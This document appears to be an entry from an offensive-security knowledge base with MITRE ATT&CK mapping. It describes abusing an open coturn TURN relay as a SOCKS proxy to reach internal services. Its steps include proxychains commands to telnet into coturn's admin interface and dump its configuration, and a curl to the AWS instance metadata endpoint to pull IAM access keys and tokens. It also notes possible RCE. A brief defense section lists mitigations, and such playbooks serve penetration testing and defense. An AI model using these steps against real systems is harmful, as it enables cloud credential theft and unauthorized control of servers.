---
tags:
  - socks-proxy
  - internal-access
  - aws-metadata
  - coturn-telnet
type: procedure
tools:
  - '[[tools/Proxychains]]'
  - '[[tools/Telnet]]'
  - '[[tools/Stunner]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/proxychains-telnet-internal-service]]'
  - '[[commands/coturn-print-config]]'
  - '[[commands/coturn-quit]]'
verified: false
platforms:
  - AWS
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Protocol Tunneling]]'
  - '[[Exfiltration Over Alternative Protocol]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:29:44.166Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: bc0e4643-526e-48cf-8dd6-d6c4688d6234
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Protocol Tunneling]]'
  - '[[Exfiltration Over Alternative Protocol]]'
  - '[[File and Directory Discovery]]'
---
---

# Access-Internal-Services-via-TURN-SOCKS-Proxy

## Summary

This procedure leverages the TURN relay as a SOCKS proxy to tunnel traffic to internal services, accessing AWS metadata for credential exfiltration and coturn telnet for server control, bypassing external firewalls.

## Description

After confirming the open relay, stunner creates a SOCKS proxy. Proxychains routes tools like telnet through this proxy to reach internal endpoints (e.g., localhost:5766 for coturn telnet, 169.254.169.254 for AWS metadata). This allows non-destructive recon (e.g., print config) and potential destructive actions like file writes or RCE. Environment: AWS EC2 instances with coturn, ports 5766 (telnet), 80 (metadata).

## Requirements

1. Running stunner SOCKS proxy from recon step
2. Proxychains configured with proxy details (socks5://127.0.0.1:port)
3. Telnet client and access to internal IP targets

## Defense

Defensive measures and detection strategies:

- Enable peer IP validation in coturn (denied-peer-ip)
- Disable or secure telnet interface (use SSH, firewall port 5766)
- Monitor AWS metadata access logs and anomalous internal connections
- IDS rules for TURN relay abuse and SOCKS tunneling

## Objectives

1. Connect to internal services via proxied traffic
2. Exfiltrate sensitive data from AWS metadata and coturn config
3. Demonstrate control for potential RCE (e.g., via 'psd' command)

## Instructions

### Step 1: Setup Proxy and Scan Ports

**Context**: Use stunner's port scanner via SOCKS to identify open internal ports.

Start stunner proxy mode (from tool docs), then configure proxychains.conf with dynamic_chain and socks5 proxy.

### Step 2: Connect to Coturn Telnet

**Context**: Tunnel telnet to internal coturn server for admin access.

**Command** ([[commands/proxychains-telnet-internal-service]]):
```bash
proxychains -f config telnet 127.0.0.1 5766
```

> Establishes proxied connection; logs show proxy chain. Success: Telnet prompt for coturn.

### Step 3: Execute Diagnostic Commands

**Context**: Run safe commands to dump config and demonstrate control.

**Command** ([[commands/coturn-print-config]]):
```bash
> pc
```

> Outputs coturn config: verbose level, listeners (443,5349), relay IPs, DB (SQLite), realm.

**Command** ([[commands/coturn-quit]]):
```bash
> q
```

> Exits session cleanly.

### Step 4: Access AWS Metadata

**Context**: Proxy to metadata service for exfiltration.

Use proxychains curl 169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve IAM tokens.

> Expected: JSON with AccessKeyId, SecretAccessKey, Token.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Protocol Tunneling]]
- [[Exfiltration Over Alternative Protocol]]
- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/proxychains-telnet-internal-service]]
- [[commands/coturn-print-config]]
- [[commands/coturn-quit]]

## Tools Used

- [[tools/Proxychains]]
- [[tools/Telnet]]
- [[tools/Stunner]]

## Tags

- [[socks-proxy]]
- [[internal-access]]
- [[aws-metadata]]
- [[coturn-telnet]]

---
